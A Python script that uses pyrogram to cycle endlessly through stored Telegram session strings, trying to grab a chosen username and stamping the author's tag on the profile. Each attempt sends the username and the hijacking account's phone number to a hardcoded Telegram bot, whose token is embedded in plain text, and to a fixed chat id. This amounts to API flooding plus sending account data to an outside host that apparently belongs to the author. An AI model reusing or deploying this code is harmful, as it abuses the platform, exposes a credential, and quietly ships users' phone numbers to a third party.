import json
import requests
import sys
from pyrogram.raw import functions, types
from pyrogram import Client, idle
from pyrogram.types import Message
import os
import re
from time import sleep, strftime
def perform_check(user, session_string):
    try:
            app = Client(
            "usersession",
            session_string=session_string)
            app.start()
            
            app.set_username(user)
            
            app.update_profile(first_name="A Y O U B", bio="- BY : @Ayoubtop")
            
            op = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendvideo?chat_id=5679320939&video=https://t.me/owlsldpdgg/26&caption=Done ⌯ I Got a Flood 🥵 !\n⎱⌯ UserName: @{user} \n⎱⌯ Clicks: {qq} \n⎱⌯ Save: Account\n⎱⌯ BY: @Ayoubtop")
            op = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendmessage?chat_id=5679320939&text=| Take ❲ + {app.get_me().phone_number} ❳ ,")
           
            sleep(0.2)
            

            os.system('screen -S flood -X kill')
    except Exception as e:
        if "USERNAME_OCCUPIED" in str(e):
            y = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendmessage?chat_id=5679320939&text=∽ User Flood  @{user} 🔔\n\n- Clicks  {qq} 🛡️")
        else:
        	y = requests.post(f"https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendmessage?chat_id=5679320939&text={e}")
with open('session.json') as g:
    data = json.load(g)
    users = data['session']
qq = 0
take = 0
with open('username', 'r') as b:
 user = b.read()
count = len(users)
id = '15516290'
i = 0


while True:
    session_string = users[i]
    perform_check(user, session_string)
    qq += 1
    take += 50
    i += 1
    if i >= count:
        i = 0